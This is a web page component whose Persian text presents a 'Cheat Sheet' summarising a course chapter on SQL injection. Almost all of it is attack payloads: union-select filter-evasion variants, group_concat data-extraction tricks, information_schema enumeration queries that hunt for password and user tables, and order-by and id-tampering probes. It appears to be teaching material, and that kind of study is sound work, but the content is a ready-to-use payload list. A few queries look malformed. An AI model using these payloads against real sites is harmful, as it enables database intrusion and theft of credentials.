/** @format */

import { Bold, Card, Code, TextNote } from '@/app/Components/common'
import { LI, UL } from '@/app/Components/List'

export default function CheatSheet() {
  return (
    <Card title='Cheat Sheet'>
      <p>
        این بخش خلاصه و جمع بندی فصل
        <code> SQL Injection </code>
        می باشد که در آن یک چک لیست از دستورات مورد نیاز و روش انجام کار بصورت تجمیع شده قرار دارد.
      </p>



      <UL>
        <LI title='group_concat'>
          <Code light>
            {"unhex(hex(group_concat(table_name)))"}
          </Code>
          <Code light>
            {"unhex(hex(gRoup_cOncat(table_name))) frOm admin--"}
          </Code>
          <div className='flex justify-between items-center'>
            <span>زمانی که سایت در حالت لودینگ می ماند.</span>
            <Code light>
              {"uncompress(compress(group_concat(table_name)))"}
            </Code>
          </div>

          <div className='flex justify-between items-center'>
            <span>زمانی که عبارات نمایش داده شده حالت بی معنی دارد.</span>
            <Code light>
              {"binary(unbinary(group_concat(table_name)))"}
            </Code>
          </div>

          <Code light>
            {"group_concat ==> limit"}
          </Code>
        </LI>

        <LI title='table_name'>
          <Code light>
            version 4
          </Code>
        </LI>

        <LI title='from'>
          <Code light>
            ip
          </Code>
        </LI>
        <LI title='information_schema.tables'>
          <Code light>
            information_schema.partitions
          </Code>
        </LI>
        <LI title='information_schema.tables where database_schema=database()'>
          <Code light>
            information_schema.statistics
          </Code>
          <Code light>
            Guess Columns
          </Code>
        </LI>

        <LI title='union select'>
          <Code light>
            {"/*!12345union*/ select"}
          </Code>
          <Code light>
            {"%23asdasd%0aunion"}
          </Code>
          <Code light>
            {"%75nion %73elect"}
          </Code>
          <Code light>
            {"database() ==> database%28%29"}
          </Code>
        </LI>

        <LI title='id=10'>
          <Code light>
            {"id=-10"}
          </Code>
          <Code light>
            {"id=10 and 0"}
          </Code>
          <Code light>
            {"id=10 div 0"}
          </Code>
          <Code light>
            {"id=10 and 0 like 1"}
          </Code>
          <Code light>
            {"id=10 where 0 like 1"}
          </Code>
          <Code light>
            {"id=(10)"}
          </Code>
          <Code light>
            {"id=6535635354"}
          </Code>
          <Code light>
            {"id=null"}
          </Code>
        </LI>
        <LI title={"id=10' order by 76876--+"}>
          <Code light>
            {"id=10' order by 76876-- -"}
          </Code>
          <Code light>
            {"id=10' order by 76876--+-"}
          </Code>
          <Code light>
            {"id=10' order by 76876--#"}
          </Code>
          <Code light>
            {"id=10' order by 76876--%23"}
          </Code>
          <Code light>
            {"id=10' order by 76876--*/"}
          </Code>
        </LI>
        <LI title="like">
          <p>برای زمانی که جدوال زیاد است و ما دنبال جدولی می گردیم که فرضا فیلد <code>password</code>  دارد.</p>
          <Code>{"group_concat(table_name) from information_schema.columns where column_name like %pass--"}</Code>
          <p>برای زمانی که جدوال زیاد است و ما دنبال جدولی می گردیم که فرضا نام <code>user</code>  دارد.</p>

          <Code>{"group_concat(table_name) from information_schema.tables where table_name like %user--"}</Code>

          <p>
            در صورتی بعد از پیدا کردن جدول <code>users</code> نتوانستیم فیلد هارا بیرون بکشیم باید <code>schema</code> جدول را با دستور زیر پیدا کرده و استفاده کنیم:
          </p>
          <Code light>
            <Code>{"group_concat(schema_name) from information_schema.tables from information_schema.schemata--"}</Code>

          </Code>
        </LI>
      </UL>
      <TextNote>
        <Code>{"group_concat(table_name'<br/>')"}</Code>
        <Code>{"table_name from information_schema.tables where table_schema=database() limit 0,1--"}</Code>
        <Code>{"column_name from information_schema.columns where table_name='admin' limit 0,1--"}</Code>

        <p>مقدار <code>limit</code> معمولا از 0 یا 1 است.</p>
        <p>مقدار n=1 یعنی جدوال را یکی یکی نمایش می دهد.</p>
      </TextNote>
    </Card>
  )
}
